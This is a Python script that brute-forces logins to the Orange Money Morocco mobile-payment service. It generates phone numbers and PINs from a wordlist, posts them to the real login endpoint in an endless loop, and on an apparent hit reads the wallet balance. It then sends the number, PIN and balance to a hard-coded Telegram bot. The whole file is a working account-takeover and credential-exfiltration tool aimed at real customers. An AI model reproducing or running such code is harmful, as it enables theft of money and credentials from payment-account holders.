import requests as r
import threading,random
Z = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
A = '\033[2;34m'#ازرق
C = '\033[2;35m' #وردي
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح
ss = 0
aa = 0
while True:
	lines = open('8').read().splitlines()
	myline =random.choice(lines)
	codes = myline.split(":")[0]
	ok = myline.split(":")[1]
	myline1 =random.choice(lines)
	codes1 = myline1.split(":")[0]
	ok1 = myline1.split(":")[1]
	myline2 =random.choice(lines)
	codes2 = myline2.split(":")[0]
	ok2 = myline2.split(":")[1]
	myline4 =random.choice(lines)
	codes4 = myline4.split(":")[0]
	ok4 = myline4.split(":")[1]
	me = codes+codes1+codes2+codes4
	you = ok+ok1+ok2+ok4
	us = str(''.join((random.choice("1234567890") for i in range(4))))
	NUMBERS = "06"+us+me
	url = "https://apps.orange.ma/orangemoney/web/authentification/login"
	head = {
	    "Accept": "application/json;version=1.0",
	    "Accept-Language": "en",
	    "User-Agent": "Android 5.1.1",
	    "Content-Type": "application/x-www-form-urlencoded",
	    "Content-Length": "572",
	    "Host": "apps.orange.ma",
	    "Connection": "Keep-Alive",
	    "Accept-Encoding": "gzip"
	}
	data = {"msisdn":NUMBERS,"pin":you,"device_id":"95f29eb2559ad5d","key":"kczkMwta5CGpIdTenfPomdJMmA6aXjBuJBDqhpsyVnihUMgfPiHYqlJIO4AsjiSFIZ8emGZeMS7xedA4svVAwpDQpZKuoc6I0vaGgJ0TLVWl15wt6YEoRii2v44UhIvy-Mj7Sx2sxtSyxQw0WXeIZu5Ium8Ua7nw7tlYp5qSyHSZNSlegpn_4B0ysWIEfL83KEZevO3rFCOJq3KlbOH6dw04iij8-sHFs8GprOBK5PBNKk82hM2KF7d5O2W_DtvLREMRzXw1b__9gMMhT_G0nQ4Cxxk3SIDcB30A0uW7g0y6EoGdCKkVbKs6QWRaLTVSv4-R_TfDj2zolQS1e66WMg%3D%3D","firebase_id":"fp_JkfzpUbU%3AAPA91bGGTnR3ftozb6l1KMXmbwvEp83Hsp80WXyIGyWdXGzlo3gu2yPfQxSDsQclwJrPG5TJlYRTLc5m4qsQMwvpgy2jLKIRSVUEVrFKeDTTRkIpYvRMZT280_2y308rWM1vqDLaobJu"}
	req = r.post(url, headers=head, data=data)
	if "Une erreur est survenue" in req.text:
		ss += 1
	elif "402" in req.text:
		ss += 1
	elif "Le code saisi est incorrect" in req.text:
		ss += 1
	elif "Dashboard" or "token" in req.text:
		aa += 1
		DH = (req.json()["response"]["wallet_balance"]["balance"])
		r.post(f"https://api.telegram.org/bot2085870348:AAGjI2fOXlwr-BuuWwHq3t8-XG5uhSjIxSk/sendMessage?chat_id=1803859361&text=new account\n num >>> {NUMBERS}:{you}:{DH}\nGUUS {ss}\ngood {aa}")
	print(f"GUSSS >>> {ss}\nGODES >>> {aa}")
